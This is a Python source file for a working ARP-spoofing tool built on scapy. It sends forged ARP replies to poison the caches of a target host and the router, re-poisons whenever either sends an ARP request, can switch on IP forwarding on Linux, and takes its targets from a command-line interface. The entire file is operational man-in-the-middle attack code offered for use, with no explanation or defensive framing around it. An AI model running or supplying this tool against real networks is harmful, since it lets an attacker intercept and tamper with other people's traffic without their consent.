import scapy.all as scapy
from time import sleep
import threading
from argparse import ArgumentParser


class Spoof:

    def __init__(self,targetip,routerip,mac=None,ip_forward=False):
        #TODO: Support for multiple targets
        self.mymac = mac
        self.targetip = targetip
        self.routerip = routerip
        
        try:
            self.targetmac = self.getMac(self.targetip)
            self.routermac = self.getMac(self.routerip)

        except IndexError:
            pass
            raise Exception("Couldn't get targets MAC address")

        if ip_forward:
            self.ipForward()

    def getMac(self,ip):

        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        full = broadcast / arp_request
        answer = scapy.srp(full, timeout = 6, verbose = False)[0]
        return answer[0][1].hwsrc


    def spoof(self,target_ip,target_mac,spoof_ip,attacker_mac=None):

        if attacker_mac is None:
            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip)
        else:
            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip,hwsrc = attacker_mac)

        scapy.send(packet, verbose = False)


    def showOptions(self):
        if self.mymac == None:
            print("Your MAC: Default")
        else:
            print("Your MAC:", self.mymac)
        print("Target IP:", self.targetip)
        print("Target MAC:", self.targetmac)
        print("Router IP:", self.routerip)
        print("Router MAC:", self.routermac)

    def t(self,pkt):

        if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:

            if pkt.psrc == self.targetip and pkt.pdst == self.routerip:
                print(self.targetip, "is asking for", self.routerip, ", sending spoofed replies...")
                for x in range(5):
                    self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
                    sleep(0.5)

            if pkt.psrc == self.routerip and pkt.pdst == self.targetip:
                print(self.routerip, "is asking for", self.targetip, ", sending spoofed replies...")
                for x in range(5):
                    self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
                    sleep(0.5)

    def arpTrigger(self,pkt):

        threading.Thread(target=self.t, args=(pkt,)).start()

    def ipForward(self):

        #TODO: Implement cross-platform IP forwarding

        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
        f = open(ip_forward_path)
        
        if f.read() == "1\n":
            f.close()

        else:
            f.close()
            print("Enabling IP Forwarding...")
            f = open(ip_forward_path, "w")
            f.write("1\n")
            f.close()


    def start(self):

        for x in range(5):
            self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
            self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
            sleep(0.5)

        f = "host {} and host {} and arp".format(self.targetip,self.routerip)
        scapy.sniff(prn=self.arpTrigger, filter=f, store=0)

        print("\nResting ARP cache and exiting...")
        self.spoof(self.targetip,self.targetmac,self.routerip,self.routermac)
        self.spoof(self.routerip,self.routermac,self.targetip,self.targetmac)

def main():
    parser = ArgumentParser(description="Spoof ARP replies on your LAN")
    parser.add_argument("-t", "--target", help="IP Address of target", required=True)
    parser.add_argument("-r", "--router", help="IP Address of router (optional)", default=scapy.conf.route.route("0.0.0.0")[2])
    parser.add_argument("-m", "--mac", help="Manually set your mac address (optional)", default=None)
    cli_input = parser.parse_args()
    spoofer = Spoof(cli_input.target,cli_input.router,cli_input.mac)
    spoofer.showOptions()
    spoofer.start()

if __name__ == "__main__":
    main()
